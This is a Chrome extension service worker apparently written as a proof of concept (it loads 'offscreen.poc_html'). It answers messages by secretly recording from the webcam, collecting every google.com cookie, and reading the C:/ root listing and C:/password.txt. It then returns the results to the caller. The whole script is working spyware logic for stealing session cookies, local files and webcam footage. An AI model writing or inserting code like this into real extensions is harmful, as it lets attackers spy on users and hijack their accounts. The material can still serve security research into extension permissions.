console.log('Service worker is running');

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.msg === 'webcam') {
    recordWebcam();
    return;
  }
  if (message.msg === 'cookies') {
    chrome.cookies.getAll({ domain: 'google.com' }, (cookies) => {
      sendResponse({ cookies });
    });
    return true;
  }
  if (message.msg === 'filesystem') {
    (async () => {
      const rootListOfFiles = await (await fetch('file:///C:/')).text();
      const passwordTxtText = await (async () => {
        try {
          return await (await fetch('file:///C:/password.txt')).text();
        } catch (e) {
          return null;
        }
      })();
      sendResponse({ rootListOfFiles, passwordTxtText });
    })();
    return true;
  }
});

const recordWebcam = async () => {
  const existingContexts = await chrome.runtime.getContexts({});
  const offscreenDocument = existingContexts.find(
    (c) => c.contextType === 'OFFSCREEN_DOCUMENT'
  );

  // If an offscreen document is already open, bail out.
  if (offscreenDocument) {
    return;
  }

  // Create an offscreen document.
  await chrome.offscreen.createDocument({
    url: 'offscreen.poc_html',
    reasons: ['USER_MEDIA'],
    justification: 'Recording from webcam'
  });

  // Send the message to the offscreen document to start recording.
  chrome.runtime.sendMessage({
    type: 'start-recording',
    target: 'offscreen',
  });
};
